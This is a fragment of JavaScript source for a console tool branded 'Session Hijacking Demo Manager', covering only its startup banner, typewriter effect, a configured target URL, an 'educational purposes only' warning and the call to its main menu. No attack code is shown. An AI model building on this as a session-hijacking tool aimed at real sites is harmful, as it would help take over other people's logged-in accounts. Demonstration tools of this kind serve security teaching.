// STARTUP SEQUENCE
// ============================================
async function startupSequence() {
    clearScreen();
    console.log('');
    console.log(`${C.magenta}${C.bright}
 ███████╗███████╗███████╗███████╗██╗ ██████╗ ███╗   ██╗
 ██╔════╝██╔════╝██╔════╝██╔════╝██║██╔═══██╗████╗  ██║
 ███████╗█████╗  ███████╗███████╗██║██║   ██║██╔██╗ ██║
 ╚════██║██╔══╝  ╚════██║╚════██║██║██║   ██║██║╚██╗██║
 ███████║███████╗███████║███████║██║╚██████╔╝██║ ╚████║
 ╚══════╝╚══════╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝${C.reset}`);
    console.log(`${C.dim}  ════════════════════════════════════════════════════════════${C.reset}`);
    console.log(`${C.magenta}${C.bright}  SESSION${C.reset}${C.dim} // Hijacking Demo Manager v1.0${C.reset}`);
    console.log(`${C.dim}  ════════════════════════════════════════════════════════════${C.reset}`);
    console.log('');

    await typewriterEffect(`  ${C.cyan}[SYS]${C.reset} Initializing Session Hijacking Manager...`, 20);
    await new Promise(r => setTimeout(r, 300));
    console.log(`  ${C.green}[OK ]${C.reset} Configuration loaded`);
    await new Promise(r => setTimeout(r, 200));
    console.log(`  ${C.green}[OK ]${C.reset} Scenarios ready`);
    await new Promise(r => setTimeout(r, 200));
    console.log(`  ${C.green}[OK ]${C.reset} Target: ${config.targetUrl}`);
    await new Promise(r => setTimeout(r, 200));
    console.log(`  ${C.yellow}[WARN]${C.reset} FOR EDUCATIONAL PURPOSES ONLY`);
    await new Promise(r => setTimeout(r, 500));
    console.log('');
    console.log(`  ${C.dim}Press Enter to access main menu...${C.reset}`);
    await ask('');
}

function typewriterEffect(text, delay = 15) {
    return new Promise(resolve => {
        let i = 0;
        const interval = setInterval(() => {
            process.stdout.write(text[i]);
            i++;
            if (i >= text.length) {
                clearInterval(interval);
                resolve();
            }
        }, delay);
    });
}

// ============================================
// MAIN ENTRY POINT
// ============================================
(async () => {
    await startupSequence();
    await mainMenu();
})();
